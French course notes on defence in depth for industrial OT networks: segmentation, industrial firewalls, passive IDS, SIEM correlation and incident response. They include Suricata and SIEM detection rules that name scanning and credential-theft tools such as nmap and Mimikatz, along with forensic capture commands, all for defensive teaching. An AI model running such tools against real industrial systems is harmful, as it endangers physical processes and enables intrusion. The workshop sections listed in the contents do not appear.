# SEC500 — Jour 4 : Défense en profondeur & réponse aux incidents
**Cybersécurité appliquée à l'industrie 4.0**
*Mastère Chef de projet Industrie 4.0 — Année 2 · JUNIA XP 2025/2026*

---

## Sommaire

- [Module 6 — Architecture de défense en profondeur](#module-6)
  - [6.1 Principes de la défense en profondeur appliqués à l'OT](#61-defence-en-profondeur)
  - [6.2 Segmentation réseau IT/OT — DMZ industrielle, VLAN, bastions](#62-segmentation)
  - [6.3 Firewalls industriels et listes blanches applicatives](#63-firewalls)
  - [6.4 Détection d'intrusion OT — IDS passifs, Nozomi, Claroty, Dragos](#64-ids-ot)
  - [6.5 SIEM industriel — collecte et corrélation des logs OT](#65-siem)
  - [6.6 Réponse aux incidents OT — triage, confinement, forensique, communication](#66-reponse-incidents)
- [Atelier 3 — Simulation d'un incident ransomware industriel (scénario EKANS)](#atelier-3)
- [Briefing TP MecaProd — préparation du Jour 5](#briefing-mecaprod)

---

## Module 6 — Architecture de défense en profondeur {#module-6}

### 6.1 Principes de la défense en profondeur appliqués à l'OT {#61-defence-en-profondeur}

#### Origine du concept

La **défense en profondeur** (Defence in Depth) est une stratégie militaire héritée de la Première Guerre mondiale, consistant à multiplier les lignes de défense successives de sorte qu'un attaquant ayant percé la première ligne rencontre immédiatement une deuxième, puis une troisième, etc.

En cybersécurité, le principe est identique : **aucune mesure de sécurité n'est infaillible**. La défense en profondeur suppose qu'un attaquant déterminé franchira tôt ou tard chaque barrière individuelle. L'objectif est de l'obliger à franchir de nombreuses barrières successives, augmentant ainsi le temps de détection et le coût de l'attaque jusqu'à le rendre prohibitif.

**Formulation NIST :** "La défense en profondeur est l'application de plusieurs couches de contre-mesures de sécurité de sorte que la défaillance d'un seul mécanisme ne compromette pas la sécurité de l'ensemble du système."

---

#### Les trois axes de la défense en profondeur

La défense en profondeur s'organise autour de trois axes complémentaires :

**Axe 1 — Prévention (réduire la probabilité d'une attaque réussie)**
- Authentification forte (MFA, certificats)
- Chiffrement des communications (TLS, mTLS)
- Segmentation réseau (VLAN, DMZ, firewalls)
- Gestion des patches et des vulnérabilités
- Contrôle d'accès physique (badges, serrures, vidéosurveillance des locaux OT)

**Axe 2 — Détection (identifier une attaque en cours ou passée)**
- IDS réseau passif (analyse du trafic OT)
- SIEM et corrélation de logs
- Supervision des accès distants (journalisation de sessions)
- Honeypots OT (leurres qui détectent les scans et intrusions)
- Alertes sur anomalies comportementales (nouveau flux, nouvel équipement, FC d'écriture inhabituel)

**Axe 3 — Réponse et récupération (limiter l'impact et rétablir les opérations)**
- Plan de réponse aux incidents (IRP — Incident Response Plan)
- Plan de continuité d'activité (PCA) et plan de reprise d'activité (PRA)
- Sauvegardes testées et isolées (offline backups)
- Procédures de communication de crise
- Exercices de simulation (red team, tabletop exercises)

---

#### Modèle en couches pour l'OT industriel

La défense en profondeur OT s'organise en couches concentriques, de la périmètre externe jusqu'aux équipements de terrain :

```
┌─────────────────────────────────────────────────────────────────┐
│  Couche 1 : Périmètre externe                                   │
│  Pare-feu périmétrique, VPN, MFA, IPS, filtrage DNS            │
├─────────────────────────────────────────────────────────────────┤
│  Couche 2 : Réseau IT                                           │
│  Segmentation IT, EDR, antivirus, gestion des patches IT       │
├─────────────────────────────────────────────────────────────────┤
│  Couche 3 : Frontière IT/OT                                     │
│  DMZ industrielle, Data Diode, firewall OT, jump server        │
├─────────────────────────────────────────────────────────────────┤
│  Couche 4 : Réseau OT de supervision (N2/N3)                   │
│  IDS OT passif, SIEM, surveillance des accès HMI/SCADA         │
├─────────────────────────────────────────────────────────────────┤
│  Couche 5 : Réseau OT de contrôle (N1)                         │
│  Firewall applicatif OT, liste blanche des flux Modbus/S7comm  │
├─────────────────────────────────────────────────────────────────┤
│  Couche 6 : Équipements de terrain (N0/N1)                     │
│  Authentification PLC si disponible, accès physique sécurisé,  │
│  ports USB désactivés, armoires verrouillées                   │
└─────────────────────────────────────────────────────────────────┘
```

> **Principe clé :** si un attaquant franchit la Couche 1 (compromission d'un poste IT via phishing), les Couches 2 à 6 doivent empêcher sa progression vers les équipements de contrôle. En l'absence de défense en profondeur, un réseau plat offre un accès direct de la Couche 1 aux Couches 5 et 6 — c'est le cas MecaProd avant l'attaque EKANS.

---

### 6.2 Segmentation réseau IT/OT — DMZ industrielle, VLAN, bastions {#62-segmentation}

#### Pourquoi la segmentation est la mesure n°1

La segmentation réseau est la mesure de sécurité OT la plus impactante car elle :
- **Contient la propagation** d'une attaque (un malware sur le réseau IT ne peut pas atteindre les PLC)
- **Réduit la surface d'exposition** des équipements OT non patchables
- **Crée des points de contrôle** où le trafic peut être filtré et surveillé
- **Est indépendante** des équipements OT (elle ne nécessite pas de modifier les PLC)

**Avant la segmentation — réseau plat MecaProd :**
```
Internet ──[RDP 3389]──> PC SCADA ──────────────> PLC1, PLC2, PLC3
                         │                        (Modbus/TCP libre)
                         └──> Postes bureautiques, ERP, messagerie
```
Un accès RDP compromis donne accès à tout le réseau, y compris aux automates.

**Après la segmentation — architecture cible :**
```
Internet ──[VPN+MFA]──> Jump Server (DMZ) ──[accès contrôlé]──> PC SCADA
                                                                     │
                                                            Firewall OT
                                                                     │
                                                          Réseau OT isolé
                                                       PLC1, PLC2, PLC3
```

---

#### Architecture DMZ industrielle — conception détaillée

La **DMZ industrielle** (Industrial Demilitarized Zone) est une zone réseau tampon placée entre le réseau IT et le réseau OT. Elle héberge les services qui doivent être accessibles des deux côtés (historiens de données, serveurs de mise à jour, jump server).

**Architecture à deux firewalls (recommandée IEC 62443, ANSSI) :**

```
      Réseau IT
          │
    ┌─────┴───────────────────────────────────────────┐
    │  Firewall 1 (IT → DMZ)                          │
    │  Règles : autoriser les flux IT légitimes        │
    │  vers DMZ (port historien, accès jump server)   │
    └─────┬───────────────────────────────────────────┘
          │
    ┌─────┴───────────────────────────────────────────┐
    │  DMZ industrielle                               │
    │  • Historien de données (OSIsoft PI, Aveva)     │
    │  • Jump server (bastion) avec enregistrement    │
    │  • Serveur de fichiers OT (échange de logs)     │
    │  • Serveur de mise à jour OT (WSUS isolé)       │
    │  • Reverse proxy SCADA (accès web supervisé)    │
    └─────┬───────────────────────────────────────────┘
          │
    ┌─────┴───────────────────────────────────────────┐
    │  Firewall 2 (DMZ → OT)                          │
    │  Règles : uniquement les flux OT stricts         │
    │  (ex. : port 502 de supervision vers PLC N1)    │
    │  Refus par défaut (deny all, permit by exception)│
    └─────┬───────────────────────────────────────────┘
          │
      Réseau OT
```

**Règles typiques du Firewall 2 (DMZ → OT) :**

| Source | Destination | Port/Proto | Autorisation | Commentaire |
|---|---|---|---|---|
| Serveur SCADA (DMZ) | PLC zone ligne 1 | TCP/502 | ✓ Autorisé | Modbus supervision |
| Jump server (DMZ) | HMI supervision | TCP/3389 | ✓ Autorisé (avec enregistrement) | Accès maintenance |
| Historien (DMZ) | Réseau OT | UDP/135 (OPC-DA) | ✓ Autorisé | Collecte données |
| Tout | Tout | Tout autre | ✗ Refusé | Deny by default |

**Architecture à une seule DMZ et Data Diode (cas extrême) :**

La **Data Diode** (diode réseau) est un composant matériel qui impose un flux **unidirectionnel** : les données peuvent circuler uniquement de l'OT vers l'IT (collecte de données), mais aucune commande ne peut revenir de l'IT vers l'OT. C'est la solution la plus sécurisée pour les environnements critiques (nucléaire, défense, énergie).

```
   Réseau OT ───[DATA DIODE]──> Réseau IT
              flux unidirectionnel physiquement imposé
              (matériel : fibres optiques à sens unique)
```

**Exemples de Data Diodes :** Waterfall Security (WF-500), Owl Cyber Defense, Fox-IT DataDiode.

---

#### VLAN — segmentation logique intra-OT

Les **VLAN (Virtual LAN)** permettent de segmenter logiquement un réseau OT en sous-réseaux isolés sur la même infrastructure physique. Ils sont complémentaires de la DMZ (segmentation logique vs physique).

**Exemple de plan de VLAN pour MecaProd :**

| VLAN ID | Nom | Équipements | Sous-réseau |
|---|---|---|---|
| 10 | IT-Bureautique | Postes bureautiques, imprimantes | 10.0.10.0/24 |
| 20 | IT-Serveurs | ERP, AD, messagerie | 10.0.20.0/24 |
| 30 | DMZ-Industrielle | Historien, jump server | 10.0.30.0/24 |
| 40 | OT-Supervision | SCADA, HMI | 192.168.40.0/24 |
| 50 | OT-Controle-L1 | PLC ligne 1 | 192.168.50.0/24 |
| 60 | OT-Controle-L2 | PLC ligne 2 | 192.168.60.0/24 |
| 70 | OT-IIoT | Capteurs MQTT, passerelles | 192.168.70.0/24 |
| 99 | Management | Interfaces de gestion switchs/routeurs | 10.0.99.0/24 |

**Règles inter-VLAN :** tout trafic entre VLAN passe par le firewall OT. Les VLAN 50, 60 ne communiquent jamais directement avec les VLAN 10, 20 (obligation de transiter par le firewall + DMZ).

---

#### Bastion (Jump Server) — contrôle des accès d'administration

Le **jump server** (ou bastion) est le point d'accès unique et contrôlé pour toute administration des équipements OT. Il élimine les accès directs (RDP, SSH) depuis le réseau IT vers le réseau OT.

**Fonctionnalités d'un bastion industriel :**
- **Authentification forte** (MFA obligatoire pour toute connexion)
- **Enregistrement de sessions** (vidéo + keylogger de toutes les actions d'administration)
- **Justification de connexion** (obligation de renseigner la raison et le ticket de maintenance)
- **Double validation** (accord d'un superviseur pour les connexions sur les zones critiques)
- **Gestion des accès tiers** (compte temporaire créé/désactivé automatiquement pour chaque intervenant)
- **Alertes en temps réel** (notification au RSSI de toute connexion OT)

**Exemples de solutions :** CyberArk Privileged Access Manager, BeyondTrust, Wallix Bastion (solution française), Centrify.

---

### 6.3 Firewalls industriels et listes blanches applicatives {#63-firewalls}

#### Firewalls industriels — spécificités OT

Un **firewall industriel** se distingue d'un firewall IT par sa capacité à inspecter les protocoles OT jusqu'au niveau applicatif (Deep Packet Inspection — DPI) :

| Capacité | Firewall IT classique | Firewall industriel |
|---|---|---|
| Filtrage IP/port | ✓ | ✓ |
| Inspection TCP/UDP | ✓ | ✓ |
| **DPI Modbus** | ✗ | ✓ — filtre par Function Code (ex. : bloquer FC≥5) |
| **DPI S7comm** | ✗ | ✓ — filtre par type de service S7 |
| **DPI DNP3/OPC-UA** | ✗ | ✓ |
| Résistance aux environnements industriels | ✗ | ✓ (température, vibrations, DIN rail) |
| Mode fail-open / fail-close | Rarement | ✓ (choix critique pour l'OT) |
| Certifications OT | ✗ | ✓ (IEC 61850, IEC 62443 ready) |

**Fonctionnalité DPI Modbus — exemple de règle :**

```
Règle n°12 : BLOQUER les écritures Modbus non autorisées
  Source      : any (tout équipement)
  Destination : 192.168.50.110 (PLC ligne 1)
  Port        : TCP/502
  Protocole   : Modbus/TCP
  Condition   : Function Code IN (5, 6, 15, 16) AND Source NOT IN (192.168.40.10)
  Action      : DROP + ALERT
  Commentaire : Seul le serveur SCADA (192.168.40.10) est autorisé à écrire des registres
```

**Exemples de firewalls industriels :**
- **Claroty xDome** / **SCADAguardian** (Nozomi) — solutions OT intégrées
- **Cisco IR1100 / IE3x00** — routeurs/firewalls pour réseaux OT
- **Fortinet FortiGate Rugged** — firewall durci pour environnements industriels
- **Siemens SCALANCE S** — firewall dédié réseau Siemens (PROFINET, S7comm)
- **Hirschmann Eagle** — firewall OT allemand, très répandu dans l'industrie

---

#### Liste blanche applicative (Application Allowlisting)

L'**application allowlisting** (liste blanche) n'autorise l'exécution que d'un ensemble prédéfini d'applications approuvées. Tout exécutable non listé est bloqué.

**Pourquoi c'est la mesure antivirale recommandée en OT :**

| Antivirus (liste noire) | Application Allowlisting (liste blanche) |
|---|---|
| Bloque les menaces **connues** | Bloque tout ce qui n'est pas **explicitement autorisé** |
| Nécessite des mises à jour fréquentes (signatures) | La liste est statique (les HMI ne changent jamais) |
| Peut interférer avec les logiciels SCADA | Protège l'environnement SCADA sans interférence |
| Inefficace contre les zero-days | Bloque tout nouvel exécutable (y compris ransomware) |
| Consomme des ressources CPU | Empreinte CPU minimale |

**Logiciels d'application allowlisting pour OT :**
- **Tripwire** (intégrity monitoring + allowlisting)
- **McAfee Application Control** (désormais Trellix)
- **Ivanti Application Control**
- **Carbon Black App Control** (VMware)

**Sur les postes SCADA/HMI Windows :** activer **Windows Defender Application Control (WDAC)** ou **AppLocker** avec une politique stricte autorisant uniquement les binaires signés et approuvés.

---

### 6.4 Détection d'intrusion OT — IDS passifs, Nozomi, Claroty, Dragos {#64-ids-ot}

#### Principes de la détection d'intrusion en OT

Un **IDS (Intrusion Detection System)** surveille le trafic réseau ou l'activité des hôtes pour détecter des comportements suspects. En OT, plusieurs contraintes spécifiques s'imposent :

**Pourquoi l'IDS OT doit être passif :**
- Un IDS actif (IPS) qui bloque du trafic peut interrompre des processus critiques
- Les équipements OT à faible CPU peuvent être déstabilisés par des sondes actives
- La priorité est la **détection sans interférence** avec le processus

**Architecture de déploiement — port SPAN :**

```
  Switch OT (managed)
  ┌─────────────────────────────────────────┐
  │  Port 1 ── PLC ligne 1                 │
  │  Port 2 ── PLC ligne 2                 │
  │  Port 3 ── HMI supervision             │
  │  Port 4 ── Passerelle IT/OT            │
  │                                         │
  │  Port SPAN ── Sonde IDS OT  ◄── copie  │
  │  (tous les flux sont mirrorés vers      │
  │   la sonde — lecture seule)            │
  └─────────────────────────────────────────┘
```

La sonde IDS est **en écoute uniquement** — elle n'envoie aucun paquet sur le réseau OT. Elle ne peut ni bloquer ni modifier le trafic.

---

#### Méthodes de détection IDS OT

**1. Détection par signature (Signature-based)**
- Comparaison du trafic réseau avec une base de règles connues (CVE, patterns d'attaque)
- Rapide, peu de faux positifs
- Aveugle aux attaques inconnues (zero-days)
- Nécessite des mises à jour régulières de la base de signatures

**2. Détection par anomalie (Anomaly-based)**
- Construction d'une baseline du comportement normal du réseau OT (pendant 2 à 4 semaines)
- Alerte sur tout écart significatif : nouvel équipement, nouveau flux, nouvel horaire, nouveau Function Code
- Détecte les attaques inconnues
- Plus de faux positifs (nécessite un tuning initial)

**Baseline typique pour un réseau Modbus/TCP :**
```
Baseline apprise :
  - Équipements actifs : {192.168.50.110, 192.168.50.111, 192.168.50.112}
  - Flux autorisés : 192.168.40.10 ↔ 192.168.50.110 (TCP/502)
  - Function Codes observés : FC=3 (lecture), FC=1 (lecture coils)
  - Fréquence : 1 requête/seconde ±10%
  - Plages horaires actives : 06h00 – 22h00

Anomalies qui déclencheraient une alerte :
  → FC=6 depuis 192.168.50.50 (IP inconnue) [nouvel acteur]
  → FC=16 depuis 192.168.40.10 à 03h00 [heure anormale]
  → 50 requêtes/seconde depuis 192.168.40.99 [scan possible]
  → Nouvelle IP 192.168.50.200 détectée [nouvel équipement]
```

**3. Détection comportementale (Behavioral)**
- Modèles ML/IA construits sur l'historique du processus
- Détecte des déviations subtiles (ex. : valeur de registre inhabituelle pour la saison)
- Approche des solutions commerciales avancées (Claroty, Dragos)

---

#### Solutions IDS OT commerciales

**Nozomi Networks (SCADAguardian / Guardian)**
- Leader du marché IDS OT passif
- Support de 400+ protocoles industriels (Modbus, S7comm, PROFINET, DNP3, IEC 61850...)
- Inventaire automatique des équipements OT
- Intégration SIEM (Splunk, IBM QRadar, Microsoft Sentinel)
- Déployable en appliance physique ou VM

**Claroty (xDome / Continuous Threat Detection)**
- Forte intégration avec les environnements IT (CrowdStrike, Palo Alto)
- Module de gestion des vulnérabilités OT (croisement CVE avec l'inventaire)
- Tableau de bord de risque par zone IEC 62443

**Dragos Platform**
- Spécialisé sur les menaces OT étatiques et APT
- Base de données de groupes de menaces ICS (CHERNOVITE, ELECTRUM, KAMACITE...)
- Approche "threat intelligence" très poussée
- Principalement utilisé dans l'énergie, l'eau, le pétrole/gaz

**Solution open source — Zeek + Suricata (avec dissecteurs OT)**
- **Zeek** (anciennement Bro) : analyse réseau et génération de logs structurés
- **Suricata** : IDS avec règles Emerging Threats (contient des règles pour Modbus, DNP3)
- **ELK Stack** : Elasticsearch + Logstash + Kibana pour la visualisation
- Option économique pour les PME industrielles

**Déploiement pratique de Zeek sur une sonde OT :**

```bash
# Installation Zeek sur Ubuntu 22.04 (sonde branchée sur port SPAN)
sudo apt-get install zeek zeek-core

# Configuration de l'interface en mode promiscuité
sudo ip link set eth0 promisc on

# Lancement de Zeek sur l'interface SPAN
cd /opt/zeek/bin
sudo ./zeek -i eth0 local.zeek

# Logs générés automatiquement dans /opt/zeek/logs/current/ :
# conn.log      — toutes les connexions réseau
# modbus.log    — transactions Modbus (si dissecteur actif)
# weird.log     — anomalies protocolaires
# notice.log    — alertes

# Exemple de ligne dans modbus.log :
# ts=1699001234 uid=Cab345 src=192.168.40.10 dst=192.168.50.110
# func=WRITE_SINGLE_REGISTER register=100 value=9999
```

**Règles Suricata pour détecter les attaques Modbus :**

```
# Règle : détecter une écriture Modbus (FC=06) depuis une source non autorisée
alert tcp !192.168.40.10 any -> 192.168.50.0/24 502 (
  msg:"MODBUS Write Single Register from unauthorized source";
  content:"|00 00 00 06|"; offset:2; depth:4;  # header Modbus/TCP
  content:"|06|"; offset:7; depth:1;            # Function Code 06
  classtype:protocol-command-decode;
  sid:9000001; rev:1;
)

# Règle : détecter un scan Modbus (connexions rapides vers port 502)
alert tcp any any -> 192.168.50.0/24 502 (
  msg:"MODBUS TCP Scan Detected";
  flags:S;
  threshold: type threshold, track by_src, count 10, seconds 5;
  classtype:network-scan;
  sid:9000002; rev:1;
)
```

---

### 6.5 SIEM industriel — collecte et corrélation des logs OT {#65-siem}

#### Présentation du SIEM

Un **SIEM (Security Information and Event Management)** collecte, normalise et corrèle les événements de sécurité provenant de sources hétérogènes pour détecter des menaces complexes et produire des alertes actionnables.

**Sans SIEM :** chaque source de logs (Windows, firewall, IDS, PLC, HMI) génère ses propres événements dans des formats différents. La détection d'une attaque multi-étapes (phishing IT → pivot → écriture PLC) nécessite de croiser manuellement des logs de sources différentes — quasi impossible en temps réel.

**Avec SIEM :**
```
  Windows Events ──┐
  Firewall logs   ──┤
  IDS OT alerts  ──┼──> SIEM ──> Corrélation ──> Alerte : "Ransomware probable"
  SCADA logs     ──┤    (normalisation        (règle : login RDP + PowerShell
  VPN logs       ──┘    horodatage)            + scan réseau OT + FC=06 anormal)
```

---

#### Sources de logs OT pertinentes

**Logs Windows (postes SCADA/HMI/Jump server) :**

| EventID | Description | Pertinence OT |
|---|---|---|
| **4624** | Connexion réussie | Accès RDP au SCADA — qui et quand |
| **4625** | Échec de connexion | Tentative de brute force RDP |
| **4648** | Connexion avec credentials explicites | Utilisation d'un autre compte (pass-the-hash) |
| **4688** | Création d'un nouveau processus | Exécution d'un nouvel outil (Nmap, Mimikatz) |
| **4698** | Création d'une tâche planifiée | Persistence par tâche planifiée (ransomware) |
| **4719** | Modification de politique d'audit | Tentative d'effacement de traces |
| **7036** | Changement d'état d'un service | Démarrage d'un service malveillant |
| **7045** | Nouveau service installé | Installation d'un service (lateral movement) |

**Logs firewall OT :**
- Connexions acceptées et refusées (source, destination, port, timestamp)
- Alertes DPI Modbus (FC d'écriture non autorisés)
- Volume de trafic anormal (spike → DoS ou scan)

**Logs IDS OT (Nozomi, Claroty) :**
- Alertes d'anomalie réseau (nouveau flux, nouvelle IP, nouveau protocole)
- Alertes de vulnérabilité (équipement avec CVE critique détecté)
- Alertes de comportement (scan, écriture de registre inhabituelle)

**Logs VPN et accès distants :**
- Connexions VPN (utilisateur, IP source, durée, volume de données)
- Sessions jump server (enregistrements vidéo, commandes exécutées)

---

#### Règles de corrélation SIEM — exemples OT

**Règle 1 — Détection de brute force suivi d'un accès RDP réussi :**
```
IF COUNT(EventID=4625, source_ip=X, timewindow=5min) > 20
AND EventID=4624 (source_ip=X, logon_type=10 [RDP])
THEN ALERT "Brute force RDP réussi depuis IP X"
     PRIORITY = CRITICAL
```

**Règle 2 — Propagation latérale vers le réseau OT :**
```
IF EventID=4624 (computer IN OT_HOSTS, source_ip NOT IN OT_AUTHORIZED_IPS)
THEN ALERT "Accès non autorisé sur poste OT"
     PRIORITY = HIGH
```

**Règle 3 — Exécution d'outil de scan réseau :**
```
IF EventID=4688 (process_name IN ["nmap.exe","masscan.exe","angry_ip.exe"])
   AND computer IN SCADA_HOSTS
THEN ALERT "Outil de scan réseau exécuté sur poste SCADA"
     PRIORITY = CRITICAL
```

**Règle 4 — Ransomware OT — séquence caractéristique :**
```
IF EventID=7045 (service_name LIKE "%{random}%", timewindow=1h)
AND EventID=4688 (process_name="cmd.exe", parent="services.exe")
AND IDS_ALERT (type="new_ip_on_ot_network")
AND Firewall_ALERT (type="modbus_write_from_unknown_src")
THEN ALERT "RANSOMWARE OT PROBABLE — Séquence EKANS détectée"
     PRIORITY = CRITICAL
     ACTION = notify_soc + isolate_network_segment
```

---

#### Solutions SIEM OT

| Solution | Éditeur | Intégration OT | Type |
|---|---|---|---|
| **Microsoft Sentinel** | Microsoft | Connecteurs Claroty, Nozomi, Dragos | Cloud (Azure) |
| **Splunk Enterprise Security** | Splunk | Add-on Modbus, intégration IDS OT | On-premise / Cloud |
| **IBM QRadar** | IBM | DSM OT, connecteurs industriels | On-premise / Cloud |
| **Elastic SIEM** | Elastic | Zeek + Suricata intégrés | Open source / Cloud |
| **Securonix** | Securonix | UEBA + OT analytics | Cloud |
| **ALSOC** (ANSSI PDIS) | Prestataires qualifiés | Spécifique OIV | Service managé |

---

### 6.6 Réponse aux incidents OT — triage, confinement, forensique, communication {#66-reponse-incidents}

#### Cadre de réponse aux incidents

La réponse aux incidents en OT suit un cadre structuré en 6 phases, adapté du SANS Incident Response Process et du NIST SP 800-61 :

```
  1. PRÉPARATION          2. IDENTIFICATION       3. CONFINEMENT
  ─────────────────       ─────────────────       ─────────────────
  Plans, procédures,      Détection, triage,      Isolation du
  outils prêts,           qualification de        segment compromis,
  contacts établis        l'incident              préservation des
                                                  preuves

  4. ÉRADICATION          5. REPRISE              6. POST-INCIDENT
  ─────────────────       ─────────────────       ─────────────────
  Suppression du          Restauration des        Analyse causes,
  malware, patch,         opérations,             retour d'expérience,
  correction de la        tests de validation,    amélioration des
  vulnérabilité           surveillance renforcée  procédures
```

---

#### Phase 1 — Préparation

La préparation est la phase la plus importante : 80 % de l'efficacité de la réponse aux incidents dépend du travail réalisé **avant** l'incident.

**Éléments indispensables :**

- **Plan de réponse aux incidents (IRP)** documenté, testé et mis à jour annuellement
- **Arbre de décision** : comment qualifier un incident ? Quand passer au niveau supérieur ?
- **Annuaire de crise** : contacts internes (RSSI, DSI, DG, RH, Communication) et externes (CERT-FR, prestataire IR, assureur cyber, avocat)
- **Inventaire à jour** des équipements OT (savoir ce qui tourne avant de devoir le restaurer)
- **Sauvegardes testées** des programmes PLC, configurations firewall, images SCADA
- **Outils forensiques prêts** : clés USB forensiques, logiciels d'analyse (FTK, Autopsy, Volatility)
- **Exercices réguliers** : tabletop exercises (simulations sur table), red team annuel

---

#### Phase 2 — Identification et triage

**Qualifier l'incident :** avant toute action, il faut comprendre la nature et l'étendue de l'incident.

**Questions de triage :**
1. Quelle est la source de l'alerte ? (IDS, SIEM, opérateur, fournisseur externe)
2. Quels systèmes sont affectés ? (IT seul, IT+OT, OT seul)
3. Le processus de production est-il impacté ? (ralentissement, arrêt, comportement anormal)
4. Des données ont-elles été exfiltrées ?
5. L'incident est-il toujours en cours ?
6. S'agit-il d'un faux positif ?

**Classification de sévérité :**

| Niveau | Critères | Exemples | Réponse |
|---|---|---|---|
| **P1 — Critique** | Impact production en cours, risque sécurité physique | Ransomware actif sur SCADA, PLC commandé à l'insu des opérateurs | Cellule de crise immédiate |
| **P2 — Majeur** | Système compromis, propagation détectée | Présence malware sur poste SCADA, scan OT depuis IT | Équipe IR activée sous 1h |
| **P3 — Modéré** | Tentative détectée, pas de compromission confirmée | Brute force RDP bloqué, anomalie réseau isolée | Investigation sous 4h |
| **P4 — Mineur** | Événement suspect, investigation nécessaire | Log inhabituel, accès hors heures | Analyse dans les 24h |

---

#### Phase 3 — Confinement en environnement OT

Le confinement OT est **radicalement différent** du confinement IT. En IT, on peut éteindre un serveur compromis immédiatement. En OT, éteindre un PLC peut provoquer :
- Un arrêt brutal d'un four à 1200°C → destruction de la production en cours
- L'ouverture de vannes de sécurité → déversement, accident
- La désynchronisation d'une ligne de production → dommages mécaniques

**Principe fondamental du confinement OT :**
> **Ne jamais couper brutalement un équipement OT sans avoir d'abord vérifié que le processus est dans un état sûr ou que des procédures de sécurité automatiques prendront le relais.**

**Options de confinement OT par ordre de risque croissant :**

1. **Isolation réseau logique** (le moins risqué) — bloquer le VLAN compromis au niveau du switch, sans toucher aux équipements
2. **Isolation de la passerelle IT/OT** — couper uniquement le lien DMZ/IT, laisser le réseau OT fonctionner de manière isolée
3. **Retrait du poste compromis** — déconnecter physiquement uniquement le poste identifié comme compromis (HMI, PC ingénierie)
4. **Mise en mode local** — basculer les PLC en mode de contrôle local (opérateurs sur le terrain) pour s'affranchir de la supervision compromise
5. **Arrêt de production planifié** (le plus risqué) — si aucune autre option n'est viable, arrêt progressif et contrôlé selon les procédures HSE

**Préservation des preuves numériques (forensique) :**

Avant toute action corrective, préserver les preuves :
```bash
# 1. Capture mémoire vive du poste SCADA compromis
# (à faire avant toute extinction — la mémoire est volatile)
winpmem_mini_x64.exe mem_dump_$(hostname)_$(date +%Y%m%d_%H%M).raw

# 2. Copie forensique du disque (sur un support isolé)
dd if=/dev/sda of=/mnt/forensic/image_$(hostname).img bs=4M status=progress

# 3. Export des logs Windows avant écrasement
wevtutil epl Security C:\forensic\Security.evtx
wevtutil epl System C:\forensic\System.evtx
wevtutil epl Application C:\forensic\Application.evtx

# 4. Capture du trafic réseau en cours
tshark -i eth0 -w /mnt/forensic/capture_$(date +%Y%m%d_%H%M).pcap
```

---

#### Phase 4 — Éradication

**Actions en environnement OT :**
- Supprimer le malware identifié (avec précaution — ne pas désactiver les logiciels SCADA en cours)
- Restaurer les programmes PLC depuis des sauvegardes **antérieures à la compromission** (vérifiées et signées)
- Changer **tous** les mots de passe : comptes Windows, comptes SCADA, credentials VPN
- Révoquer les certificats potentiellement compromis
- Patcher la vulnérabilité exploitée (si possible sans arrêt de production immédiat)
- Bloquer les IoC (Indicators of Compromise) sur le firewall : IPs malveillantes, domaines C2, hashes malware

---

#### Phase 5 — Reprise et retour en production

**Checklist de reprise OT :**
- [ ] Vérifier l'intégrité des programmes PLC (hash comparé à la sauvegarde de référence)
- [ ] Tester les automates en mode simulation avant de relancer la production
- [ ] Vérifier les valeurs de tous les registres critiques (consignes de température, pression, vitesse)
- [ ] Confirmer que les systèmes de sécurité (SIS, arrêts d'urgence) fonctionnent correctement
- [ ] Remettre en service progressivement (ligne par ligne, pas en bloc)
- [ ] Surveiller intensivement les premières heures de reprise (IDS en mode alerte haute)
- [ ] Maintenir des équipes de maintenance sur site pendant la reprise

---

#### Communication de crise

La communication de crise doit être **préparée à l'avance** et activée dès la qualification P1/P2.

**Parties prenantes et messages :**

| Audience | Timing | Canal | Message clé |
|---|---|---|---|
| **Direction générale** | Dans l'heure | Téléphone + note écrite | Faits, impact production, actions engagées, ressources nécessaires |
| **Opérateurs de production** | Immédiat | Réunion flash sur site | Que faire / ne pas faire, mode dégradé |
| **DSI / RSSI** | Immédiat | Téléphone | Étendue technique, ressources IR |
| **Clients impactés** | Dans les 4h | Email officiel | Délais, impact, engagement de reprise |
| **Prestataires / fournisseurs** | Selon implication | Email + téléphone | Instructions de confinement de leurs accès |
| **CERT-FR / ANSSI** | Dans les 72h (OIV/OSE : obligation légale) | Formulaire CERT-FR | Déclaration d'incident selon procédure |
| **Assureur cyber** | Dans les 24h | Téléphone + email | Ouverture du sinistre |
| **Autorités (CNIL, etc.)** | Selon nature (données perso) | Formulaire CNIL | Notification de violation de données (72h RGPD) |
| **Médias** | Seulement si fuite ou obligation | Communiqué officiel | Message contrôlé, pas de détails techniques |

**Règle d'or de la communication de crise :** ne jamais communiquer des informations techniques précises sur les vecteurs d'attaque et les systèmes impactés dans des communications externes — cela pourrait aider un attaquant encore présent dans le système.

---

#### Phase 6 — Post-incident : retour d'expérience et amélioration continue

La Phase 6 est systématiquement négligée dans les PME industrielles, alors qu'elle conditionne la capacité à ne pas subir deux fois le même incident. Elle doit être menée **dans les 15 jours suivant la clôture de l'incident**, quand les souvenirs sont frais mais que la pression opérationnelle est retombée.

**Réunion de retour d'expérience (REX) :**

Participants : RSSI, DSI, responsable production, équipes de maintenance, prestataire IR (si impliqué), direction. Durée : 2 à 4 heures. Format : blameless post-mortem — l'objectif est d'améliorer le système, pas de désigner des coupables.

**Questions structurantes du REX :**
1. Quel était le vecteur d'entrée initial ? Existait-il une mesure qui aurait pu le bloquer ?
2. Combien de temps l'attaquant a-t-il séjourné dans le réseau avant d'être détecté (dwell time) ?
3. Quelles alertes ont été générées ? Ont-elles été vues ? Traitées ? Pourquoi pas ?
4. Le plan de réponse aux incidents était-il connu des personnes impliquées ?
5. Qu'est-ce qui a bien fonctionné pendant la réponse ? Qu'est-ce qui a ralenti la réponse ?
6. Les sauvegardes ont-elles permis une restauration complète ? Dans quel délai ?
7. Quels systèmes ont manqué de journalisation (logs absents ou insuffisants) ?

**Livrable du REX — rapport post-incident :**

```
RAPPORT POST-INCIDENT
─────────────────────────────────────────────────────
1. Résumé de l'incident (1 page)
   Chronologie, systèmes impactés, coût total estimé

2. Analyse des causes racines (Root Cause Analysis)
   Cause directe (ex. : RDP sans MFA)
   Cause systémique (ex. : absence de politique d'accès distants)
   Cause organisationnelle (ex. : pas de RSSI dédié, pas de plan IR testé)

3. Évaluation de la réponse
   Délai de détection (time-to-detect)
   Délai de confinement (time-to-contain)
   Délai de restauration (time-to-recover)
   Comparaison avec les objectifs RTO/RPO du PCA

4. Plan d'amélioration (lessons learned)
   Liste priorisée des mesures correctives
   Responsable, délai, coût estimé pour chacune

5. Mise à jour du plan de réponse aux incidents
   Ajout des IoC découverts dans les règles SIEM/firewall
   Correction des procédures ayant montré leurs limites
─────────────────────────────────────────────────────
```

